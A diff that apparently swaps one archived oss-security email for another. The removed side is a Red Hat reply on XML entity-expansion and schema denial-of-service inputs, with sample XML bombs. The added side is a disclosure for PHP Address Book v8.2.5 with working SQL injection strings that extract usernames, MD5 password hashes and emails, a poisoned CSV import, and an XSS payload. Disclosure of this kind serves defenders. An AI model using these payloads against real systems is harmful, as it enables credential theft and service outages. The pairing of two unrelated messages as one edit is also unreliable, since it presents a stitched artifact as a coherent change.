@@ -1,265 +1,104 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/02/22/19
-Message-ID: <233116504.3539390.1361543109852.JavaMail.root@redhat.com>
-Date: Fri, 22 Feb 2013 09:25:09 -0500 (EST)
-From: Florian Weimer <fweimer@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/04/17/2
+Message-ID: <CALuSjqb0x9Twgc5Ld+pF9zmvhctQnYTeYVLvAuwrPDzW26w6MQ@mail.gmail.com>
+Date: Wed, 17 Apr 2013 11:14:27 +0800
+From: Doraemon Sk8ers <doraemon.sk8ers@...il.com>
 To: oss-security@...ts.openwall.com
-Cc: Mitre CVE assign department <cve-assign@...re.org>
-Subject: Re: CVEs for libxml2 and expat internal and external XML entity expansion
+Subject: Multiple vulnerabilities in PHP Address Book v8.2.5
 Content-Type: text/plain; charset=utf-8
 
-On 02/22/2013 06:44 AM, Kurt Seifried wrote:
-> -----BEGIN PGP SIGNED MESSAGE-----
-> Hash: SHA1
->
-> So here are the CVE's for the two big ones, libxml2 and expat. Both
-> are affected by the expansion of internal entities (which can be used
-> to consume resources) and external entities (which can cause a denial
-> of service against other services, be used to port scan, etc.).
->
-> To be clear:
->
-> ====================
-> Internal entity expansion refers to the exponential/quadratic/fast
-> linear expansion of XML entities, e.g.:
-> ====================
-> <!DOCTYPE xmlbomb [
-> <!ENTITY a "1234567890" >
-> <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;">
-> <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;">
-> <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;">
-> ]>
-> <bomb>&d;</bomb>
->
-> or
->
-> <!DOCTYPE bomb [
-> <!ENTITY a "xxxxxxx... a couple of ten thousand chars">
-> ]>
-> <bomb>&a;&a;&a;... repeat</bomb>
->
-> Which causes resources to be consumed
+Hi,
 
-The real challenge is when the triggering entity reference is inside an
-attribute, that is:
+There is a SQL injection vulnerability and reflected XSS in Simple PHP
+Address Book v8.2.5.
+The 2 vulnerabilities had been assigned the CVE identifier CVE-2013-1748
+(SQLi) & CVE-2013-1749 (XSS) respectively.
 
-   <bomb attr="&d;"/>
+# Software Link: http://sourceforge.net/projects/php-addressbook/
+# Version: v8.2.5
+# Tested on: v8.2.5
+# CVE : CVE-2013-1748 (SQLi) & CVE-2013-1749 (XSS)
 
-With many APIs, this causes essentially unbounded memory allocation
-*inside* the XML library.  If the entity reference is inside a text
-node, data can be passed piecewise to the calling code, so memory usage
-inside the XML library can be remain roughly constant.
 
-Note that there are several other denial-of-service vectors related to
-DTD and schema validation.  I'm not yet very far in researching which
-applications are affected.  A lot of this was documented in research
-papers in the 80s and early 90s (few of which are accessible to me,
-unfortunately), and the SGML designers were likely familiar with it.
+Details:
+-----------
+*
+*
+*CVE-2013-1748 (SQLi)*
 
-* Non-deterministic content models
+We have discovered 3 pages which are prone to SQL Injection
 
-The XML DTD specification and the XML schema specification require that
-content models are deterministic, that is, something like this is not
-permitted:
+1.	/view.php?id=1
+The "id" parameter is vulnerable to SQL injection
+Injection Vector:
+	/view.php?id=-1' union select '1','2','3','4',(select username from
+users limit 1),(select md5_pass from users limit 1),(select email from
+users limit 1),'8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41
+This injection vector will dump the username, md5 password and email
+of the first user in the user table onto the page itself
 
-    <!ELEMENT root
-     (((a|b)
-     |((a|b),(a|b))
-     |((a|b),(a|b),(a|b))
-     |((a|b),(a|b),(a|b),(a|b))
-    >
+2.	/edit.php
+Most of the fields on this page are vulnerable to SQL injection
+Injection Vector (inclusive of quotes):
+	'+(select ASCII(SUBSTRING((SELECT md5_pass from users limit 1), 1)))+'
+This will dump out the ASCII value of the 1st character of the md5
+password of the first user
 
-   <xs:element name="root">
-     <xs:complexType>
-       <xs:sequence>
-         <xs:choice>
-           <xs:choice>
-             <xs:element ref="a"/>
-             <xs:element ref="b"/>
-           </xs:choice>
-           <xs:sequence>
-             <xs:choice>
-               <xs:element ref="a"/>
-               <xs:element ref="b"/>
-             </xs:choice>
-             <xs:choice>
-               <xs:element ref="a"/>
-               <xs:element ref="b"/>
-             </xs:choice>
-           </xs:sequence>
-           <xs:sequence>
-             <xs:choice>
-               <xs:element ref="a"/>
-               <xs:element ref="b"/>
-             </xs:choice>
-             <xs:choice>
-               <xs:element ref="a"/>
-               <xs:element ref="b"/>
-             </xs:choice>
-             <xs:choice>
-               <xs:element ref="a"/>
-               <xs:element ref="b"/>
-             </xs:choice>
-           </xs:sequence>
-           <xs:sequence>
-             <xs:choice>
-               <xs:element ref="a"/>
-               <xs:element ref="b"/>
-             </xs:choice>
-             <xs:choice>
-               <xs:element ref="a"/>
-               <xs:element ref="b"/>
-             </xs:choice>
-             <xs:choice>
-               <xs:element ref="a"/>
-               <xs:element ref="b"/>
-             </xs:choice>
-             <xs:choice>
-               <xs:element ref="a"/>
-               <xs:element ref="b"/>
-             </xs:choice>
-             <xs:choice>
-               <xs:element ref="a"/>
-               <xs:element ref="b"/>
-             </xs:choice>
-           </xs:sequence>
-           </xs:choice>
-         </xs:sequence>
-       </xs:sequence>
-     </xs:complexType>
-   </xs:element>
+3.	/import.php
+The same injection vulnerability as Point 2 above is also present in
+the import function
+Using the same injection vector, saved in a csv file
+	'+(select ASCII(SUBSTRING((SELECT md5_pass from users limit 1), 1)))+'
+Similarly, this injection vector will dump out the ASCII value of the
+1st character of the md5 password of the first user
 
-Some implementations do not check for this restriction and still convert
-the content model to a DFA, which can have exponential size for such inputs.
+The original input csv sample looks like this
+"Last name";"First
+name";"Birthday";"Address";"ZIP";"City";"Home";"Mobile";"E-mail
+home";"Work";"Fax";"E-mail office";"Second address";"Second phone"
+"thelastname";"thefirstname";"13.09.1951";"Street";"1234";"city,
+Country";"+1 123 456 789";"+2 345 678 910";"first.last@...l1.com";"+3
+456 789 101";"+4 567 897 011";"first.last@...l2.net";"second street,
+1234 secondcity, secondcountry";"+5 678 910 111"
 
-Relax NG allows non-deterministic content models:
+The injected csv with the injected vectors looks like this
+"Last name";"First
+name";"Birthday";"Address";"ZIP";"City";"Home";"Mobile";"E-mail
+home";"Work";"Fax";"E-mail office";"Second address";"Second phone"
+"";"injectedthrucsv";"13.09.1951";"'+(select ASCII(SUBSTRING((SELECT
+md5_pass from users limit 1), 1)))+'";"";"city, Country";"+1 123 456
+789";"+2 345 678 910";"first.last@...l1.com";"+3 456 789 101";"+4 567
+897 011";"first.last@...l2.net";"second street, 1234 secondcity,
+secondcountry";"+5 678 910 111"
 
-     <element name="root">
-       <choice>
-         <choice>
-           <ref name="a"/>
-           <ref name="b"/>
-         </choice>
-         <group>
-           <choice>
-             <ref name="a"/>
-             <ref name="b"/>
-           </choice>
-           <choice>
-             <ref name="a"/>
-             <ref name="b"/>
-           </choice>
-         </group>
-         <group>
-           <choice>
-             <ref name="a"/>
-             <ref name="b"/>
-           </choice>
-           <choice>
-             <ref name="a"/>
-             <ref name="b"/>
-           </choice>
-           <choice>
-             <ref name="a"/>
-             <ref name="b"/>
-           </choice>
-         </group>
-         <group>
-           <choice>
-             <ref name="a"/>
-             <ref name="b"/>
-           </choice>
-           <choice>
-             <ref name="a"/>
-             <ref name="b"/>
-           </choice>
-           <choice>
-             <ref name="a"/>
-             <ref name="b"/>
-           </choice>
-           <choice>
-             <ref name="a"/>
-             <ref name="b"/>
-           </choice>
-         </group>
-         </choice>
-       </group>
-     </element>
 
-I'm not sure if it is possible to validate against Relax NG schemas in
-less than quadratic time.  Relax NG does not have repeats, which makes
-more tractable (see below).
 
-* Entity references in content models
+*CVE-2013-1749 (XSS)*
 
-DTDs can contain entity references in content models:
+For the reflected XSS, we have identified the bug on edit.php
 
-    <!ELEMENT e0 EMPTY>
-    <!ENTITY % e1 "(e0,e0)">
-    <!ENTITY % e2 "(%e1;,%e1;,%e1;,%e1;,%e1;,%e1;,%e1;,%e1;,%e1;,%e1;)">
-    <!ENTITY % e3 "(%e2;,%e2;,%e2;,%e2;,%e2;,%e2;,%e2;,%e2;,%e2;,%e2)">
-    <!ELEMENT root (%e3;)?>
+1.	/edit.php
+Enter "onmouseover="alert(document.domain);" inclusive of the quotes
+into the "Address" field and click next
+On the next page, mouse over the First Name field to trigger the XSS
 
-Those are not permitted in the internal subset by the specification, but
-there might be implementations out there which still expand them.  And
-it is possible to implement this expansion efficiently because of the
-deterministic content model.
+*
+*
 
-* Expansion of content models
+Timeline:
+-------------
 
-XML Schema offers repeats:
+15 Feb 2013: Emailed vendor on bugs found
 
-   <xs:element name="root">
-     <xs:complexType>
-       <xs:sequence maxOccurs="5000">
-         <xs:choice>
-           <xs:choice>
-             <xs:element ref="a"/>
-             <xs:element ref="b"/>
-             <xs:element ref="c"/>
-          </xs:choice>
-         </xs:choice>
-       </xs:sequence>
-     </xs:complexType>
-   </xs:element>
+21 Feb 2013: Emailed vendor again
 
-If the repeats are expanded before generating the automaton, vast
-amounts of memory and processing time are required.  (This is also
-visible with GNU egrep.)
+14 Mar 2013: No response from vendor
 
-* General regular expression issues
+17 April 2013: Advisory posted (No response from Vendor, published)
 
-XML Schema embeds textual regular expressions (and does not restrict
-them to a deterministic subset), so the usual issues when processing
-them apply: huge compilation times and compile-time memory requires,
-huge run-time requires for matching certain inputs.
 
-* Other kinds of external references
+Regards
 
-XML Schema seems to support external schema references:
 
-    <root xmlns:xsi= "http://www.w3.org/2001/XMLSchema-instance"
-       xsi:noNamespaceSchemaLocation="http://www.example.com/xsd"/>
+Team Doraemon.Sk8ers
 
-Or, inside the schema:
-
-    <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
-      <xs:include schemaLocation="schema.xsd"/>
-    </xs:schema>
-
-There is also XInclude:
-
-    <xi:include xmlns:xi="http://www.w3.org/2001/XInclude"
-                href="http://www.example.com/XInclude" />
-
- > Please use CVE-2013-0338 for libxml2 internal entity expansion
-
-Hasn't libxml2 got countermeasures for that?
-
- > Please use CVE-2013-0341 for expat external entities expansion
-
-I don't think expat resolves external entities at all.  Therefore, the
-vulnerability resides entirely in the code which uses expat.
-
--- 
-Florian Weimer / Red Hat Product Security Team
